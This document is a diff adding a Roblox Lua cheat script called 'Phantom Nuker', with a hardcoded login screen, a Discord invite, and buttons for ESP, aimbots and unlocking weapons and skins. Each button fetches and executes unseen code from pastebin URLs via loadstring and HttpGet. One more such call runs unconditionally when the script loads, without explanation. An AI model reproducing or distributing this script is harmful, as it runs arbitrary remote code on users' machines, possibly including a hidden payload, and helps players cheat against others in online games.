@@ -1,0 +1,239 @@
+-- Made By BigMaX
+-- Thanks Mike Gordon for help me alot !
+
+local PhantomNuker = Instance.new("ScreenGui")
+local LoginFrame = Instance.new("Frame")
+local LoginscreenLabel = Instance.new("TextLabel")
+local username = Instance.new("TextBox")
+local password = Instance.new("TextBox")
+local LoginButton = Instance.new("TextButton")
+local DiscordLabel = Instance.new("TextLabel")
+local TextLabel = Instance.new("TextLabel")
+local PhantomNukerFrame = Instance.new("Frame")
+local PhantomNukerTitle = Instance.new("TextLabel")
+local Soon = Instance.new("TextButton")
+local ESP = Instance.new("TextButton")
+local UnlockAllWeapon = Instance.new("TextButton")
+local RageAimbot = Instance.new("TextButton")
+local LegitAimbot = Instance.new("TextButton")
+local Soon2 = Instance.new("TextButton")
+local Close = Instance.new("TextButton")
+
+
+
+PhantomNuker.Name = "Phantom Nuker"
+PhantomNuker.Parent = game.CoreGui
+
+LoginFrame.Name = "LoginFrame"
+LoginFrame.Parent = PhantomNuker
+LoginFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoginFrame.Position = UDim2.new(0.362516016, 0, 0.14419657, 0)
+LoginFrame.Size = UDim2.new(0, 375, 0, 441)
+LoginFrame.Active = true
+LoginFrame.Draggable = true
+
+LoginscreenLabel.Name = "LoginscreenLabel"
+LoginscreenLabel.Parent = LoginFrame
+LoginscreenLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoginscreenLabel.LayoutOrder = 1
+LoginscreenLabel.Size = UDim2.new(0, 374, 0, 50)
+LoginscreenLabel.Font = Enum.Font.SourceSans
+LoginscreenLabel.Text = "Login Screen"
+LoginscreenLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoginscreenLabel.TextScaled = true
+LoginscreenLabel.TextSize = 14.000
+LoginscreenLabel.TextWrapped = true
+
+username.Name = "username"
+username.Parent = LoginFrame
+username.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+username.Position = UDim2.new(0.173333332, 0, 0.226757362, 0)
+username.Size = UDim2.new(0, 245, 0, 60)
+username.Font = Enum.Font.SourceSans
+username.Text = "Username"
+username.TextColor3 = Color3.fromRGB(255, 255, 255)
+username.TextScaled = true
+username.TextSize = 14.000
+username.TextWrapped = true
+
+password.Name = "password"
+password.Parent = LoginFrame
+password.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+password.Position = UDim2.new(0.173333332, 0, 0.478458107, 0)
+password.Size = UDim2.new(0, 245, 0, 60)
+password.Font = Enum.Font.SourceSans
+password.Text = "Password"
+password.TextColor3 = Color3.fromRGB(255, 255, 255)
+password.TextScaled = true
+password.TextSize = 14.000
+password.TextWrapped = true
+
+LoginButton.Name = "LoginButton"
+LoginButton.Parent = LoginFrame
+LoginButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoginButton.Position = UDim2.new(0.22133334, 0, 0.705215394, 0)
+LoginButton.Size = UDim2.new(0, 205, 0, 50)
+LoginButton.Font = Enum.Font.SourceSans
+LoginButton.Text = "Login"
+LoginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoginButton.TextScaled = true
+LoginButton.TextSize = 14.000
+LoginButton.TextWrapped = true
+LoginButton.MouseButton1Down:connect(function()
+	if username.Text == "1Day" and password.Text == "GO" then
+		LoginFrame.Visible = false
+		PhantomNukerFrame.Visible = true
+	end
+
+end)
+
+DiscordLabel.Name = "DiscordLabel"
+DiscordLabel.Parent = LoginFrame
+DiscordLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+DiscordLabel.Position = UDim2.new(0, 0, 0.922902584, 0)
+DiscordLabel.Size = UDim2.new(0, 374, 0, 34)
+DiscordLabel.Font = Enum.Font.SourceSans
+DiscordLabel.Text = "https://discord.gg/A4WrBp7VZV"
+DiscordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordLabel.TextScaled = true
+DiscordLabel.TextSize = 14.000
+DiscordLabel.TextWrapped = true
+
+TextLabel.Parent = LoginFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.Position = UDim2.new(0, 0, 0.897959232, 0)
+TextLabel.Size = UDim2.new(0, 375, 0, 14)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Join the discord server to get the username and password !"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+PhantomNukerFrame.Name = "Phantom Nuker Frame"
+PhantomNukerFrame.Parent = PhantomNuker
+PhantomNukerFrame.Active = true
+PhantomNukerFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+PhantomNukerFrame.Position = UDim2.new(0.0159640908, 0, 0.409669459, 0)
+PhantomNukerFrame.Size = UDim2.new(0, 608, 0, 392)
+PhantomNukerFrame.Visible = false
+PhantomNukerFrame.Active = true
+PhantomNukerFrame.Draggable = true
+
+PhantomNukerTitle.Name = "PhantomNukerTitle"
+PhantomNukerTitle.Parent = PhantomNukerFrame
+PhantomNukerTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+PhantomNukerTitle.BackgroundTransparency = 1.000
+PhantomNukerTitle.Size = UDim2.new(0, 538, 0, 50)
+PhantomNukerTitle.Font = Enum.Font.SourceSans
+PhantomNukerTitle.Text = "Phantom Nuker "
+PhantomNukerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+PhantomNukerTitle.TextScaled = true
+PhantomNukerTitle.TextSize = 14.000
+PhantomNukerTitle.TextWrapped = true
+
+Soon.Name = "Soon"
+Soon.Parent = PhantomNukerFrame
+Soon.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Soon.Position = UDim2.new(0.0730393231, 0, 0.742346883, 0)
+Soon.Size = UDim2.new(0, 200, 0, 65)
+Soon.Font = Enum.Font.SourceSans
+Soon.Text = "Soon"
+Soon.TextColor3 = Color3.fromRGB(255, 255, 255)
+Soon.TextScaled = true
+Soon.TextSize = 14.000
+Soon.TextWrapped = true
+
+ESP.Name = "ESP"
+ESP.Parent = PhantomNukerFrame
+ESP.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+ESP.Position = UDim2.new(0.59606564, 0, 0.464285731, 0)
+ESP.Size = UDim2.new(0, 200, 0, 65)
+ESP.Font = Enum.Font.SourceSans
+ESP.Text = "ESP"
+ESP.TextColor3 = Color3.fromRGB(255, 255, 255)
+ESP.TextScaled = true
+ESP.TextSize = 14.000
+ESP.TextWrapped = true
+ESP.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/xdt4uKV5", true))()
+end)
+
+UnlockAllWeapon.Name = "Unlock All Weapon"
+UnlockAllWeapon.Parent = PhantomNukerFrame
+UnlockAllWeapon.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+UnlockAllWeapon.Position = UDim2.new(0.0730393752, 0, 0.464285672, 0)
+UnlockAllWeapon.Size = UDim2.new(0, 200, 0, 65)
+UnlockAllWeapon.Font = Enum.Font.SourceSans
+UnlockAllWeapon.Text = "Unlock All Weapon/Skins/Attachements"
+UnlockAllWeapon.TextColor3 = Color3.fromRGB(255, 255, 255)
+UnlockAllWeapon.TextScaled = true
+UnlockAllWeapon.TextSize = 14.000
+UnlockAllWeapon.TextWrapped = true
+UnlockAllWeapon.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/ib9ZeB4C"))()
+end)
+
+RageAimbot.Name = "RageAimbot"
+RageAimbot.Parent = PhantomNukerFrame
+RageAimbot.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+RageAimbot.Position = UDim2.new(0.5960657, 0, 0.193877518, 0)
+RageAimbot.Size = UDim2.new(0, 200, 0, 65)
+RageAimbot.Font = Enum.Font.SourceSans
+RageAimbot.Text = "Rage Aimbot (only headshot)"
+RageAimbot.TextColor3 = Color3.fromRGB(255, 255, 255)
+RageAimbot.TextScaled = true
+RageAimbot.TextSize = 14.000
+RageAimbot.TextWrapped = true
+RageAimbot.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/af4nzbmJ"))()
+end)
+
+LegitAimbot.Name = "LegitAimbot"
+LegitAimbot.Parent = PhantomNukerFrame
+LegitAimbot.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LegitAimbot.Position = UDim2.new(0.0730394125, 0, 0.193877518, 0)
+LegitAimbot.Size = UDim2.new(0, 200, 0, 65)
+LegitAimbot.Font = Enum.Font.SourceSans
+LegitAimbot.Text = "Legit Aimbot"
+LegitAimbot.TextColor3 = Color3.fromRGB(255, 255, 255)
+LegitAimbot.TextScaled = true
+LegitAimbot.TextSize = 14.000
+LegitAimbot.TextWrapped = true
+LegitAimbot.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/3K6eYdsp", true))()
+end)
+
+Soon2.Name = "Soon2"
+Soon2.Parent = PhantomNukerFrame
+Soon2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Soon2.Position = UDim2.new(0.59606564, 0, 0.742346883, 0)
+Soon2.Size = UDim2.new(0, 200, 0, 65)
+Soon2.Font = Enum.Font.SourceSans
+Soon2.Text = "Soon"
+Soon2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Soon2.TextScaled = true
+Soon2.TextSize = 14.000
+Soon2.TextWrapped = true
+
+Close.Name = "Close"
+Close.Parent = PhantomNukerFrame
+Close.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Close.Position = UDim2.new(0.884868443, 0, 0, 0)
+Close.Size = UDim2.new(0, 70, 0, 50)
+Close.Font = Enum.Font.SourceSans
+Close.Text = "X"
+Close.TextColor3 = Color3.fromRGB(255, 0, 0)
+Close.TextScaled = true
+Close.TextSize = 14.000
+Close.TextWrapped = true
+--
+loadstring(game:HttpGet("https://pastebin.com/raw/yuBkWcEL", true))()
+-- Scripts:
+
+local function LREXGNM_fake_script() -- Close.LocalScript 
+	local script = Instance.new('LocalScript', Close)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(LREXGNM_fake_script)()
